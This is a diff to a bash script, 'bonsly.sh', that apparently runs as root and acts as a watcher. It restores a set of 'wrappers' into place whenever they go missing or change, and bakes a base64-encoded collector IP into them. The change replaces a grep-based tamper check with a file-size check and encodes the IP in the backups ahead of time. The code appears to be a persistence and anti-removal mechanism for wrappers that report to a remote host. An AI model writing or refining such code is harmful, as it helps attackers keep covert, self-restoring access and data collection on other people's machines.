@@ -24,6 +24,7 @@ _READLINK="/usr/bin/readlink"
 _SORT="/usr/bin/sort"
 _AWK="/usr/bin/awk"
 _DATE="/usr/bin/date"
+_STAT="/usr/bin/stat"
 
 if [ -z "$_H" ]; then
     echo "Usage: sudo ./bonsly.sh <collector_ip> [backup_dir]"
@@ -168,27 +169,28 @@ _cw() {
     fi
 
     RESTORED=0
-    _HE=$($_PRINTF "%s" "$_H" | $_BASE64 -w0)
     for pair in "${WRAPPERS[@]}"; do
         src="${pair%%:*}"
         dest="${pair##*:}"
         dest_path="$DEST/$dest"
         src_path="$_BD/$src"
-        if [ ! -f "$src_path" ]; then
-            _l "WARN backup missing for $src — cannot restore $dest"
+        expected_sz="${_SIZES[$src]:-}"
+        if [ -z "$expected_sz" ]; then
             continue
         fi
         RESTORE=0
         if [ ! -f "$dest_path" ]; then
             _l "WARN $dest missing — restoring"
             RESTORE=1
-        elif ! $_GREP -q "__ENC__\|${_HE}" "$dest_path" 2>/dev/null; then
-            _l "WARN $dest replaced — restoring"
-            RESTORE=1
+        else
+            actual_sz=$($_STAT -c%s "$dest_path" 2>/dev/null || echo 0)
+            if [ "$actual_sz" != "$expected_sz" ]; then
+                _l "WARN $dest size mismatch (expected=${expected_sz} actual=${actual_sz}) — restoring"
+                RESTORE=1
+            fi
         fi
         if [ $RESTORE -eq 1 ]; then
             $_CP "$src_path" "$dest_path"
-            $_SED -i "s/__ENC__/$_HE/g" "$dest_path"
             $_CHMOD 755 "$dest_path"
             _l "INFO restored $dest"
             RESTORED=$((RESTORED+1))
@@ -196,6 +198,16 @@ _cw() {
     done
     [ $RESTORED -gt 0 ] && _l "INFO restored $RESTORED wrapper(s)"
 }
+
+# Pre-bake base64 IP into backup copies so restores are straight copies
+_HE=$($_PRINTF "%s" "$_H" | $_BASE64 -w0)
+declare -A _SIZES
+for _pair in "${WRAPPERS[@]}"; do
+    _src="${_pair%%:*}"
+    [ -f "$_BD/$_src" ] || continue
+    $_SED -i "s/__ENC__/$_HE/g" "$_BD/$_src"
+    _SIZES[$_src]=$($_STAT -c%s "$_BD/$_src")
+done
 
 _l "INFO watcher started (collector=${_H}:${_P}, backup=${_BD}, interval=${_IV}s)"
 while true; do
